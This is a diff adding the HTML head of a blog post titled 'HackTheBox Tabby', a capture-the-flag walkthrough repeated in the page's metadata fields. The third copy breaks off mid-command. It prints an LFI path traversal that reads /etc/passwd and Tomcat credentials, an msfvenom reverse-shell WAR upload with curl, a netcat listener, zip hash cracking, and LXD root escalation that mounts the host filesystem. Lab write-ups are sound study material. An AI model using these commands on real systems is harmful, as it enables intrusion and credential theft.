@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HackTheBox Tabby | DC0deZer0</title>
+<meta name="generator" content="Jekyll v4.2.0">
+<meta property="og:title" content="HackTheBox Tabby">
+<meta name="author" content="Jeevan Chandra">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="Let’s get started Column       Detail     OS:           Linux Difficulty:           Easy Points:           20 Release:           20 Jun 2020 IP:           10.10.10.194 As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) Discovered open port 80/tcp on 10.10.10.194 Discovered open port 8080/tcp on 10.10.10.194 Discovered open port 22/tcp on 10.10.10.194 Completed SYN Stealth Scan at 07:52, 2.07s elapsed (1000 total ports) Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=6/21%OT=22%CT=1%CU=41896%PV=Y%DS=2%DC=T%G=Y%TM=5EEF000 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Uptime guess: 12.366 days (since Tue Jun 9 00:49:25 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 128.32 ms 10.10.14.1 2 128.88 ms 10.10.10.194 NSE: Script Post-scanning. Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds Raw packets sent: 1289 (61.746KB) | Rcvd: 1410 (433.356KB) On visiting the port 80 there is a website Megahosting.HTB with some content on it. So I desided to add megahosting.htb to /etc/hosts in my kali. 10.10.10.194 tabby.htb megahosting.htb After all the things are done, then I came to see that a URL ` http://megahosting.htb/news.php?file=statement looks like LFI` is going to work out. LFI A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. So I was able to get the /etc/passwd by doing so http://megahosting.htb/news.php?file=../.../etc/passwd. we get directory traversal. root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash Now visiting the other part of the http webpage 8080, which is a single page running tomcat server. Seeing that page, i felt that LFI should work on this page too. If LFI works in the right way as intended, then the credentials should be found in tomcat-users.xml. After a little bit of research and directory fuzzing I came to see that the correct path is /usr/share/tomcat9/etc/tomcat-users.xml Going to the source-code of the url: I was able to find the cred of the user. http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml &lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;role rolename=&quot;manager-script&quot;/&gt; &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt; Getting Foothold Time for creating the backdoor. There are two ways of doing this. This is my of doing it. Uploading a payload as .war file can give us the reverse shell. Crafting the payload with msfvenom. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war Try to use LPORT as some thing other than 1234 because there are lot of users hacking the same machine!.. Time to upload the payload now. curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file payload.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/payload.war&quot; When you see ok that means the payload has been uploaded successfully. Now set up listener nc -lvnp 5566 and go to tabby.htb:8080/payload.war and you should get a reverse shell. use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' for the shell upgrade. tomcat@tabby:/var/www/html/files$ ls ls 16162020_backup.zip archive revoked_certs statement tomcat@tabby:/var/www/html/files$ Privilege escalation to User ASH Ennumeration on /var/www/html there is a folder called files which contains a backup.zip file 16162020_backup.zip tomcat@tabby:/var/www/html/files$ ls -la ls -la total 36 drwxr-xr-x 4 ash ash 4096 Jun 17 21:59 . drwxr-xr-x 4 root root 4096 Jun 17 16:24 .. -rw-r--r-- 1 ash ash 8716 Jun 16 13:42 16162020_backup.zip So I tried extracting it, but it is password protected. Cracking the password with JOHN. zip2john 16162020_backup.zip &gt;&gt; backup-hash 16162020_backup.zip/var/www/html/assets/ is not encrypted! ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time. Trying to crack the hash with the help of rockyou.txt. john backup-hash -w=/usr/share/wordlists/rockyou.txt and the password is admin@it . Unzipping the file with the password found. unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: inflating: var/www/html/favicon.ico creating: var/www/html/files/ inflating: var/www/html/index.php extracting: var/www/html/logo.png inflating: var/www/html/news.php inflating: var/www/html/Readme.txt Bad luck! That was a Rabbit hole.. So I used the password admin@it with the user ash. su - ash Password: admin@it ash@tabby:~$ whoami whoami ash Getting User.txt ash@tabby:~$ cat user.txt cat user.txt d**********1 Privilege Escalation to Root. Checking the id of ash ash@tabby:~$ id id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) We see that ash is part of lxd group. So according to article https://www.hackingarticles.in/lxd-privilege-escalation/ I just followed the steps and got root . As there are many ways on priv esc using LXD I took help of hackingarticles for it. git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine You will get a tar.gz file. Set up http server and copy it to the remote machine. python -m SimpleHTTPServer 8080 On another hand we will download the alpine-image inside /tmp directory on the host machine. cd /tmp wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz After the image is built it can be added as an image to LXD as follows: lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh id ``` shell cd /mnt/root/root cd /mnt/root/root /mnt/root/root # cat root.txt cat root.txt 3**********5 If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
+<meta property="og:description" content="Let’s get started Column       Detail     OS:           Linux Difficulty:           Easy Points:           20 Release:           20 Jun 2020 IP:           10.10.10.194 As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) Discovered open port 80/tcp on 10.10.10.194 Discovered open port 8080/tcp on 10.10.10.194 Discovered open port 22/tcp on 10.10.10.194 Completed SYN Stealth Scan at 07:52, 2.07s elapsed (1000 total ports) Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=6/21%OT=22%CT=1%CU=41896%PV=Y%DS=2%DC=T%G=Y%TM=5EEF000 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Uptime guess: 12.366 days (since Tue Jun 9 00:49:25 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 128.32 ms 10.10.14.1 2 128.88 ms 10.10.10.194 NSE: Script Post-scanning. Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds Raw packets sent: 1289 (61.746KB) | Rcvd: 1410 (433.356KB) On visiting the port 80 there is a website Megahosting.HTB with some content on it. So I desided to add megahosting.htb to /etc/hosts in my kali. 10.10.10.194 tabby.htb megahosting.htb After all the things are done, then I came to see that a URL ` http://megahosting.htb/news.php?file=statement looks like LFI` is going to work out. LFI A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. So I was able to get the /etc/passwd by doing so http://megahosting.htb/news.php?file=../.../etc/passwd. we get directory traversal. root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash Now visiting the other part of the http webpage 8080, which is a single page running tomcat server. Seeing that page, i felt that LFI should work on this page too. If LFI works in the right way as intended, then the credentials should be found in tomcat-users.xml. After a little bit of research and directory fuzzing I came to see that the correct path is /usr/share/tomcat9/etc/tomcat-users.xml Going to the source-code of the url: I was able to find the cred of the user. http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml &lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;role rolename=&quot;manager-script&quot;/&gt; &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt; Getting Foothold Time for creating the backdoor. There are two ways of doing this. This is my of doing it. Uploading a payload as .war file can give us the reverse shell. Crafting the payload with msfvenom. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war Try to use LPORT as some thing other than 1234 because there are lot of users hacking the same machine!.. Time to upload the payload now. curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file payload.war &quot;http://10.10.10.194:8080/manager/text/deploy?path=/payload.war&quot; When you see ok that means the payload has been uploaded successfully. Now set up listener nc -lvnp 5566 and go to tabby.htb:8080/payload.war and you should get a reverse shell. use python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' for the shell upgrade. tomcat@tabby:/var/www/html/files$ ls ls 16162020_backup.zip archive revoked_certs statement tomcat@tabby:/var/www/html/files$ Privilege escalation to User ASH Ennumeration on /var/www/html there is a folder called files which contains a backup.zip file 16162020_backup.zip tomcat@tabby:/var/www/html/files$ ls -la ls -la total 36 drwxr-xr-x 4 ash ash 4096 Jun 17 21:59 . drwxr-xr-x 4 root root 4096 Jun 17 16:24 .. -rw-r--r-- 1 ash ash 8716 Jun 16 13:42 16162020_backup.zip So I tried extracting it, but it is password protected. Cracking the password with JOHN. zip2john 16162020_backup.zip &gt;&gt; backup-hash 16162020_backup.zip/var/www/html/assets/ is not encrypted! ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time. Trying to crack the hash with the help of rockyou.txt. john backup-hash -w=/usr/share/wordlists/rockyou.txt and the password is admin@it . Unzipping the file with the password found. unzip 16162020_backup.zip Archive: 16162020_backup.zip creating: var/www/html/assets/ [16162020_backup.zip] var/www/html/favicon.ico password: inflating: var/www/html/favicon.ico creating: var/www/html/files/ inflating: var/www/html/index.php extracting: var/www/html/logo.png inflating: var/www/html/news.php inflating: var/www/html/Readme.txt Bad luck! That was a Rabbit hole.. So I used the password admin@it with the user ash. su - ash Password: admin@it ash@tabby:~$ whoami whoami ash Getting User.txt ash@tabby:~$ cat user.txt cat user.txt d**********1 Privilege Escalation to Root. Checking the id of ash ash@tabby:~$ id id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) We see that ash is part of lxd group. So according to article https://www.hackingarticles.in/lxd-privilege-escalation/ I just followed the steps and got root . As there are many ways on priv esc using LXD I took help of hackingarticles for it. git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine You will get a tar.gz file. Set up http server and copy it to the remote machine. python -m SimpleHTTPServer 8080 On another hand we will download the alpine-image inside /tmp directory on the host machine. cd /tmp wget http://10.10.14.17:8080/apline-v3.10-x86_64-20191008_1227.tar.gz After the image is built it can be added as an image to LXD as follows: lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage lxc image list lxc init myimage ignite -c security.privileged=true lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true lxc start ignite lxc exec ignite /bin/sh id ``` shell cd /mnt/root/root cd /mnt/root/root /mnt/root/root # cat root.txt cat root.txt 3**********5 If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968">
+<link rel="canonical" href="https://jeevanachandra.github.io//hackthebox/2020/07/06/Tabby.html">
+<meta property="og:url" content="https://jeevanachandra.github.io//hackthebox/2020/07/06/Tabby.html">
+<meta property="og:site_name" content="DC0deZer0">
+<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/tabby/tabby.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2020-07-06T22:09:00+05:30">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/tabby/tabby.png">
+<meta property="twitter:title" content="HackTheBox Tabby">
+<script type="application/ld+json">
+{"description":"Let’s get started Column       Detail     OS:           Linux Difficulty:           Easy Points:           20 Release:           20 Jun 2020 IP:           10.10.10.194 As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) Discovered open port 80/tcp on 10.10.10.194 Discovered open port 8080/tcp on 10.10.10.194 Discovered open port 22/tcp on 10.10.10.194 Completed SYN Stealth Scan at 07:52, 2.07s elapsed (1000 total ports) Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=6/21%OT=22%CT=1%CU=41896%PV=Y%DS=2%DC=T%G=Y%TM=5EEF000 OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Uptime guess: 12.366 days (since Tue Jun 9 00:49:25 2020) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=261 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 995/tcp) HOP RTT ADDRESS 1 128.32 ms 10.10.14.1 2 128.88 ms 10.10.10.194 NSE: Script Post-scanning. Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Initiating NSE at 09:36 Completed NSE at 09:36, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds Raw packets sent: 1289 (61.746KB) | Rcvd: 1410 (433.356KB) On visiting the port 80 there is a website Megahosting.HTB with some content on it. So I desided to add megahosting.htb to /etc/hosts in my kali. 10.10.10.194 tabby.htb megahosting.htb After all the things are done, then I came to see that a URL ` http://megahosting.htb/news.php?file=statement looks like LFI` is going to work out. LFI A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. So I was able to get the /etc/passwd by doing so http://megahosting.htb/news.php?file=../.../etc/passwd. we get directory traversal. root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash Now visiting the other part of the http webpage 8080, which is a single page running tomcat server. Seeing that page, i felt that LFI should work on this page too. If LFI works in the right way as intended, then the credentials should be found in tomcat-users.xml. After a little bit of research and directory fuzzing I came to see that the correct path is /usr/share/tomcat9/etc/tomcat-users.xml Going to the source-code of the url: I was able to find the cred of the user. http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml &lt;role rolename=&quot;admin-gui&quot;/&gt; &lt;role rolename=&quot;manager-script&quot;/&gt; &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt; Getting Foothold Time for creating the backdoor. There are two ways of doing this. This is my of doing it. Uploading a payload as .war file can give us the reverse shell. Crafting the payload with msfvenom. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.X.X LPORT=5566 -f war &gt; payload.war Try to use LPORT as some thing other than 1234 because there are lot of users hacking the same machine!.. Time to upload the payload now. curl --user 